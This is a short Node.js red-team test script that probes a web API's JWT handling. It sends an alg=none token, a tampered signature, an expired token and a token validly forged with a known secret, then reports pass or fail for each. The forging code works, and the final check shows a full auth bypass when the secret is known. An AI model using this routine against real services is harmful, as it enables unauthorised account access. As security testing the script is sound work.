#!/usr/bin/env node
/**
 * R4 Red-Team — JWT forgery probe (NON-PRODUCTION). Execute against the live stack (CI/Docker).
 *
 * Usage: node jwt-forge.mjs <baseUrl> <JWT_SECRET>
 *   e.g. node jwt-forge.mjs http://localhost:8080 dev-only-change-me
 *
 * Attempts, against GET /api/teams:
 *   1. alg=none forged token            -> expect 401 (fast-jwt allows only HS256/384/512)
 *   2. valid HS256 token, flipped sig   -> expect 401
 *   3. expired HS256 token (valid sig)  -> expect 401 TOKEN_EXPIRED
 *   4. VALID HS256 token signed with the (weak/known) secret -> 200  ==> proves H1:
 *      anyone who knows JWT_SECRET forges a full session. Run with the deployed secret.
 */
import { createHmac } from 'node:crypto';

const [, , base = 'http://localhost:8080', secret = 'dev-only-change-me'] = process.argv;
const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
const sign = (h, p, key) => `${b64(h)}.${b64(p)}.${createHmac('sha256', key).update(`${b64(h)}.${b64(p)}`).digest('base64url')}`;
const now = Math.floor(Date.now() / 1000);
const claims = (exp) => ({ sub: 'forged-user', email: 'attacker@evil.test', iat: now, exp });

const noneTok = `${b64({ alg: 'none', typ: 'JWT' })}.${b64(claims(now + 3600))}.`;
const good = sign({ alg: 'HS256', typ: 'JWT' }, claims(now + 3600), secret);
const tampered = good.slice(0, -3) + (good.slice(-3) === 'AAA' ? 'BBB' : 'AAA');
const expired = sign({ alg: 'HS256', typ: 'JWT' }, claims(now - 3600), secret);

async function probe(label, token, expect) {
  const r = await fetch(`${base}/api/teams`, { headers: { Authorization: `Bearer ${token}` } });
  const ok = r.status === expect;
  console.log(`${ok ? 'PASS' : 'FAIL'}: ${label} -> ${r.status} (expected ${expect})`);
}

await probe('alg=none forgery', noneTok, 401);
await probe('tampered signature', tampered, 401);
await probe('expired (valid sig)', expired, 401);
await probe('VALID token signed with known secret (H1 auth bypass)', good, 200);
